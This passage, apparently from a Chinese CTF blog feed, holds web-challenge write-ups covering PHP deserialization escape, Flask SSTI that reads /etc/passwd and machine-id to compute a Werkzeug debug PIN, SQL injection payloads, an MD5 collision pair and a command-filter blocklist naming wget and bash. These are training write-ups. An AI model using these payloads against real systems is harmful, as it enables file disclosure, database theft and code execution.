&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>逃逸成了 </p>
<p>“;s:48: 的变量名对应的值为1 </p>
<p>​	-&gt; 注意的点<code>&quot;;s:</code>肯定有，48:是后面的值的长度</p>
<p>​	-&gt; 第二个”是传入的值的前引号</p>
<p>​	-&gt;我们需要自己构造的是闭合这个名字 <code>;</code></p>
<p>img的变量名对应的值对 base64_encode(d0g3_f1ag.php)</p>
<p>​	-&gt; 注意的点，闭合这个序列化 ;}</p>
</blockquote>
<p><strong>2.键值逃逸</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;flagflagflagflagflagphp&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>先将自己要写入的代码放进去 也就是$function的值</p>
<p>-&gt;通过测试，一步步调整 user中的值 来闭合</p>
</blockquote>
<p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
<p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
<p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-[GYCTF2020]FlaskApp的Wp</title>
    <url>/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/</url>
    <content><![CDATA[<h2 id="GYCTF2020-FlaskApp的Wp"><a href="#GYCTF2020-FlaskApp的Wp" class="headerlink" title="[GYCTF2020]FlaskApp的Wp"></a>[GYCTF2020]FlaskApp的Wp</h2><p><strong>计算PIN码的方法（必须知道的值）：</strong></p>
<blockquote>
<ol>
<li>username：就是启动这个flask的用户</li>
</ol>
<p>-&gt; <code>etc/passwd</code> 中查看</p>
<ol start="2">
<li><p>modname：一般为flask.py</p>
</li>
<li><p>getattr(app, “__name__”, app.<strong>class</strong>.<strong>name</strong>)：python该值一般为Flask 值一般不变</p>
</li>
<li><p>getattr(mod, ‘file’, None)：为flask目录下的一个app.py的绝对路径（通过报错信息一般回泄露该路径）</p>
</li>
<li><p>uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</p>
</li>
</ol>
<p>-&gt; 通过文件 <code>/sys/class/net/eth0/address</code>获取     # eth0 处为当前使用的网卡</p>
<ol start="6">
<li>get_machine_id() ：&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值</li>
</ol>
<p>-&gt;假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值</p>
<p>-&gt;假如是Docker机 那么为 &#x2F;proc&#x2F;self&#x2F;cgroup</p>
</blockquote>
<p>python shell的一些命令(os 模块)</p>
<p>import os</p>
<p>查看当前目录所有文件 <code>os.listdir(&#39;.&#39;)</code></p>
<p>查看当前目录<code>os.getcwd()</code></p>
<p>更改目录<code>os.chdir()</code></p>
<p>打开文件<code>os.popen(&#39;cat filepath&#39;).read()</code></p>
<p>打开文件<code>exec(open(&#39;filepath&#39;).read())</code> 好像会报错，但是报错中有文件内容</p>
<p><strong>解题：</strong></p>
<p>题目是FlaskAPP，打开网址，有提示.</p>
<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/03.png"></p>
<p>获取到的信息：Flask 和 PIN（根据要获得PIN的需要知道的数值） -&gt; 读取文件 -&gt;SSTI（Flask）注入读取文件</p>
<p><strong>SSTI</strong> 要寻找注入点-&gt; 先经过base64加密之后 再进行base64解码 （注入点在base64解码那里）</p>
<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/04.png"></p>
<p><strong>Payload：</strong></p>
<p><strong>1.获取username</strong></p>
<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/passwd').read()&#125;&#125;</code></p>
<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/00.png"></p>
<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/01.png"></p>
<p>2.获取Mac地址（同上, 转成十进制）</p>
<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()&#125;&#125;</code></p>
<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/02.png"></p>
<p><strong>3.获取机器ID（不止这第一个路径，还有几个其他的，都要试试，我的是这个得到了正确答案）</strong></p>
<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/machine-id').read()&#125;&#125;</code></p>
<p><strong>获取PIN的脚本（网上找的）</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;11296411583006&#x27;</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>, <span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>



<hr>
<p>参考：<a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-[MRCTF2020]套娃的Wp</title>
    <url>/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<h2 id="BUU-MRCTF2020-套娃的记录"><a href="#BUU-MRCTF2020-套娃的记录" class="headerlink" title="BUU-[MRCTF2020]套娃的记录"></a>BUU-[MRCTF2020]套娃的记录</h2><p><strong>第一关：</strong></p>
<ul>
<li><input disabled type="checkbox"> 正则绕过 URL中特殊符号的转换</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>substr_count($query, ‘_’) 计算在$query字符串中<code>_</code>出现的次数</p>
<p>preg_match(‘&#x2F;^23333$&#x2F;‘, $_GET[‘b_u_p_t’]) 正则匹配中<code>^</code>是开始的意思, <code>$</code>是结束的意思</p>
</blockquote>
<p>我们传的参数中不能存在<code>_</code> 和<code>%5f</code>&#x3D;&gt; 用空格代替（空格 . [ 都会被转换成_）</p>
<p>正则匹配的绕过，结尾加上换行符的url编码<code>%0A</code></p>
<p>payload1：<code>/?b u p t=23333%0A</code></p>
<p><strong>访问下一个页面</strong>：</p>
<ul>
<li><input disabled type="checkbox"> 编码的特征认识</li>
</ul>
<p>源码中存在JSfuck编码，<a href="http://www.hiencode.com/jsfuck.html">解码</a>&#x3D;&gt; alert(“post me Merak” </p>
<p>看Wp说也可以将JSfuck编码在控制台运行一下，也能够弹出</p>
<blockquote>
<p>alert()是js中的弹出函数</p>
</blockquote>
<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/00.png" alt="./"></p>
<p><strong>回显出第三个页面：</strong></p>
<ul>
<li><input disabled type="checkbox"> 代码审计</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();	<span class="comment">// 这里没有getIp()函数，应该是在HTTP协议里面加一个头XFF头或者其他的（很多种）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125; <span class="comment">// file_get_contents函数, 输出文件内容 flag.php</span></span><br></pre></td></tr></table></figure>

<p>主要是根据<code>$re</code>的加密过程来反过来推出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $re = &quot;flag.php&quot;;</span><br><span class="line">    $string=&#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($re);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $string.=chr(ord($re[$i]) - 2*$i);</span><br><span class="line">    &#125;</span><br><span class="line">    echo base64_encode($string);</span><br></pre></td></tr></table></figure>

<p>payload:<code>/secrettw.php?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code></p>
<p>抓包 在HTTP头加一个<code>Client-ip: 127.0.0.1</code></p>
<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/01.png"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-[SWPU2019]Web1的Wp</title>
    <url>/CTF/Web/BUU-%5BSWPU2019%5DWeb1/</url>
    <content><![CDATA[<h2 id="SWPU2019-Web1-二次注入题"><a href="#SWPU2019-Web1-二次注入题" class="headerlink" title="[SWPU2019]Web1 二次注入题"></a>[SWPU2019]Web1 二次注入题</h2><p><strong>参考</strong>:<a href="https://blog.csdn.net/satasun/article/details/109391116">https://blog.csdn.net/satasun/article/details/109391116</a></p>
<hr>
<p>知识点:</p>
<ul>
<li><input disabled type="checkbox"> <a href="https://blog.csdn.net/qq_46091464/article/details/105899269">二次注入</a></li>
<li><input disabled type="checkbox"> <a href="https://zhuanlan.zhihu.com/p/98206699">无列名注入</a></li>
<li><input disabled type="checkbox"> <a href="https://www.anquanke.com/post/id/193512">information_schema的过滤</a></li>
</ul>
<hr>
<h3 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1.二次注入"></a>1.二次注入</h3><p><strong>原理</strong></p>
<p>1.用户向数据库中插入恶意数据（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</p>
<p>2.数据库对自己存储的数据非常放心，直接取出恶意数据给用户</p>
<p><strong>过程</strong></p>
<p>(1)插入1’#</p>
<p>(2)转义成了1’\#</p>
<p>(3)放在数据库中还是1’#</p>
<p>(4)再取出这些数据时，不会转义 &#x3D;&gt; 取出的是 1’# &#x3D;&gt; 完成注入</p>
<h3 id="2-无列名注入-—-在不知道列名的情况下进行sql注入"><a href="#2-无列名注入-—-在不知道列名的情况下进行sql注入" class="headerlink" title="2.无列名注入 — 在不知道列名的情况下进行sql注入."></a>2.无列名注入 — 在不知道列名的情况下进行sql注入.</h3><p>在mysql&gt;&#x3D;5的版本中，有一个information_schema的库，里面记录着mysql所有表的结构，在sql注入中，我们会通过这个库来获取其他表的结构（列名，表名）。</p>
<p><strong>原理</strong></p>
<p>将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询。</p>
<p><strong>操作</strong></p>
<p>1.<code>select * from list;</code></p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql00.png"></p>
<p>2.<code>select 1,2,3 union select * from list;</code></p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql01.png"></p>
<p>3.select <code>3</code> from (select 1,2,3 union select * from list)a;</p>
<p>-&gt;末尾的a可以是任意字符，用于命名</p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql02.png"></p>
<p>4.<code>select b from (select 1,2,3 as b union select * from list)a;</code></p>
<p>-&gt;如果过滤了&#96;&#96;反引号，起别名</p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql03.png"></p>
<p>5.select concat(<code>2</code>,0x2d,<code>3</code>) from (select 1,2,3 union select * from list)a limit 1,3;</p>
<p>-&gt;多列查询</p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql04.png"></p>
<p>payload: <strong>select a,b from posts where a&#x3D;-1 union select 1,(select concat(<code>3</code>,0x2d,<code>4</code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</strong></p>
<h3 id="3-bypass-information-schema"><a href="#3-bypass-information-schema" class="headerlink" title="3.bypass information_schema"></a>3.bypass information_schema</h3><p><code>information_schema是什么?</code></p>
<p>-&gt;保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p>
<p>-&gt;在注入中，infromation_schema库的作用无非就是可以获取到table_schema,table_name,column_name这些数据库内的信息。</p>
<p><strong>Mysql在5.7版本新增了sys schema 基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</strong></p>
<p>sys.schema_auto_increment_columns</p>
<p>-&gt;对表自增字段的监控.</p>
<p>-&gt;只要有自增字段，那么就可以通过这个库来查询到 &#x3D;&gt; 代替了information_schema</p>
<p><strong>前提: 注入的表中存在自增字段</strong></p>
<p>如果没有呢（下面两个可以代替）</p>
<p>-&gt;schema_table_statistics_with_buffer</p>
<p>-&gt;sys.x$schema_table_statistics_with_buffer</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入网站，随便注册一个账号进入，可以发布广告 &#x3D;&gt; 想到了xss(不是很熟悉,不知道怎么去验证,看wp说是二次注入)</p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/00.png"></p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/01.png"></p>
<p>确定存在sql注入,且为二次注入 过滤了空格,or,注释符</p>
<p><strong>payload:</strong></p>
<p>1.<code>1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload00.png"></p>
<p>2.<code>1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#39;</code></p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload01.png"></p>
<p>3.<code>1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload03.png"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-easy_web的Wp</title>
    <url>/CTF/Web/BUU-easy_web/</url>
    <content><![CDATA[<p>打开题目，先抓包看看 -&gt; 两个参数img(base64编码) cmd 图片通过base64编码的格式进行传输.</p>
<p><img src="/CTF/Web/BUU-easy_web/00.png" alt="00"></p>
<p>看别人的Wp 第一次知道Bp中的Decoder模块（挺好用），不过Bp中base64解码不会主动补齐位数，导致数据上有偏差</p>
<p><img src="/CTF/Web/BUU-easy_web/02.png" alt="02"></p>
<p><img src="/CTF/Web/BUU-easy_web/01.png" alt="01"></p>
<p>也就是说，<code>这里的img参数是 555.png 经过 base16加密一次，再进行base64加密两次之后的数据  </code></p>
<p>-&gt; 对img传入的参数 要进行一次base16编码和两次base64编码和</p>
<p>Bp返回包是img参数的base64编码形式</p>
<p>没什么思路，我们先看index.php中的内容（按照img传参的要求，进行编码再传值）</p>
<p><img src="/CTF/Web/BUU-easy_web/03.png" alt="03"></p>
<p>对返回的内容base64解码得到index.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);    </span><br><span class="line"><span class="comment">//header函数实现了页面的刷新和重定向，</span></span><br><span class="line"><span class="comment">//Refresh:0: 这表示浏览器应在加载页面后立即刷新。数字 0 表示无延迟，即立即刷新。</span></span><br><span class="line"><span class="comment">//url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=: 这是指定刷新后跳转的目标 URL。在这里，它是相对于当前目录的     ./index.php，并带有两个参数，即 img 和 cmd。</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));              </span><br><span class="line"><span class="comment">//对传入的img参数进行base64解码两次，最后来一个16进制转换为2进制数据。所以我们传参需要 1.16进制转化 2.base64加密两次</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);      </span><br><span class="line"><span class="comment">// 对file参数（img解密后）进行字符串替换-&gt;将字母和数字替换为空白</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;     <span class="comment">// preg_match匹配函数，$file中如果有flag 返回1 没有就返回0 /i -&gt;不区分大小写</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`; 			<span class="comment">// ``内部包含系统命令</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li><p>header函数	-&gt; 用于发送原始的HTTP头信息，用于在服务器发送页面之前发送一些特定的HTTP头.</p>
</li>
<li><p>file参数的过滤    -&gt; 首先是替换函数，将字母和数字全部替换为空白 然后是不能出现flag    &#x2F;i-&gt; 不区分大小写.</p>
</li>
<li><p>cmd参数的过滤    </p>
</li>
<li><p>md5强转换为string类型的绕过</p>
</li>
</ol>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.的绕过（这只是一个，网上还可以搜到其他的）</span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>



<p>$file 和 $cmd -&gt; file无法直接读取flag文件，也没必要，我们可以直接 通过cmd来获得flag内容</p>
<p>也就是要绕过cmd的过滤.</p>
